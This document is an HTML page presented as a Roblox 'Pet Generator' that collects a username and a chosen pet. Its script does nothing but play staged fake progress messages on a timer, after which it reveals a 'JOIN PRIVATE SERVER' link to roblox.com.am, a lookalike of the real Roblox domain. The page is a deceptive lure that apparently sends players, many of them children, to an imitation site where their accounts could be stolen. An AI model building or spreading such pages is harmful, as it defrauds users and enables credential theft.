<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pet Generator</title>
  <style>
    body {
      font-family: 'Orbitron', sans-serif;
      background-color: #000;
      color: #fff;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');

    .container {
      margin-top: 50px;
      background: #111;
      padding: 40px;
      border-radius: 15px;
      width: 90%;
      max-width: 600px;
      margin-left: auto;
      margin-right: auto;
      box-shadow: 0 0 30px #00f;
    }

    h1 {
      color: #00f0ff;
      text-shadow: 0 0 10px #00f0ff;
      font-size: 2.2rem;
    }

    input[type="text"] {
      width: 90%;
      padding: 15px;
      margin: 20px 0;
      border: 2px solid #00f0ff;
      border-radius: 10px;
      background: transparent;
      color: white;
      font-size: 1rem;
      text-align: center;
    }

    .items-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin: 20px 0;
    }

    .item-card {
      background: #1a1a1a;
      border: 1px solid #00f0ff;
      border-radius: 10px;
      padding: 20px;
      cursor: pointer;
      transition: 0.3s;
    }

    .item-card:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px #00f0ff;
    }

    .item-card.selected {
      border: 2px solid #00f0ff;
      box-shadow: 0 0 20px #00f0ff;
    }

    button {
      background: transparent;
      border: 2px solid #00f0ff;
      color: white;
      font-size: 1.2rem;
      padding: 15px 30px;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
      margin-top: 20px;
      width: 100%;
    }

    button:hover {
      background: #00f0ff;
      color: black;
      box-shadow: 0 0 20px #00f0ff;
    }

    /* Loading screen */
    .loading-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.95);
      z-index: 1000;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
    }

    .spinner {
      border: 5px solid rgba(255,255,255,0.1);
      border-top: 5px solid #00f0ff;
      border-radius: 50%;
      width: 80px;
      height: 80px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .private-server-link {
      display: none;
      margin-top: 30px;
    }

    .private-server-link a {
      display: inline-block;
      padding: 15px 30px;
      border: 2px solid #00f0ff;
      color: #00f0ff;
      border-radius: 10px;
      text-decoration: none;
      font-size: 1.2rem;
      transition: 0.3s;
    }

    .private-server-link a:hover {
      background: #00f0ff;
      color: black;
      box-shadow: 0 0 20px #00f0ff;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Pet Generator</h1>
    <input type="text" id="username" placeholder="Enter Roblox Username">

    <div class="items-grid">
      <div class="item-card" data-item="Dragon Fly">üêâ Dragon Fly</div>
      <div class="item-card" data-item="Kitsune">ü¶ä Kitsune</div>
      <div class="item-card" data-item="Mimic Octopus">üêô Mimic Octopus</div>
      <div class="item-card" data-item="T-Rex">ü¶ñ T-Rex</div>
      <div class="item-card" data-item="Raccoon">ü¶ù Raccoon</div>
      <div class="item-card" data-item="Moon Cat">üê± Moon Cat</div>
    </div>

    <button id="generateBtn">GENERATE</button>
  </div>

  <!-- Loading Screen -->
  <div class="loading-screen" id="loadingScreen">
    <div class="spinner"></div>
    <h2 id="loadingText">INITIALIZING...</h2>
    <div class="private-server-link" id="privateServerLink">
      <p>YOUR PET IS READY!</p>
      <a href="https://www.roblox.com.am/games/126884695634066/Grow-a-Garden?privateServerLinkCode=80592778133463800279281799406968" target="_blank">JOIN PRIVATE SERVER</a>
    </div>
  </div>

  <script>
    const itemCards = document.querySelectorAll('.item-card');
    let selectedItem = null;

    itemCards.forEach(card => {
      card.addEventListener('click', function() {
        itemCards.forEach(c => c.classList.remove('selected'));
        this.classList.add('selected');
        selectedItem = this.getAttribute('data-item');
        document.getElementById('generateBtn').textContent = `GENERATE ${selectedItem.toUpperCase()}`;
      });
    });

    document.getElementById('generateBtn').addEventListener('click', function() {
      const username = document.getElementById('username').value.trim();
      if (!username) {
        alert('Please enter a Roblox username!');
        return;
      }
      if (!selectedItem) {
        alert('Please select a pet!');
        return;
      }

      const loadingScreen = document.getElementById('loadingScreen');
      loadingScreen.style.display = 'flex';

      this.disabled = true;

      const loadingStages = [
        { time: 2000, text: "PROCESSING REQUEST..." },
        { time: 4000, text: "GENERATING PET DATA..." },
        { time: 6000, text: "CONNECTING TO SERVER..." },
        { time: 8000, text: "FINALIZING GENERATION..." }
      ];

      loadingStages.forEach(stage => {
        setTimeout(() => {
          document.getElementById('loadingText').textContent = stage.text;
        }, stage.time);
      });

      // Always 10 seconds total
      setTimeout(function() {
        document.getElementById('privateServerLink').style.display = 'block';
        document.getElementById('loadingText').textContent = "GENERATION COMPLETE!";
        document.getElementById('generateBtn').disabled = false;
      }, 10000);
    });
  </script>
</body>
</html>
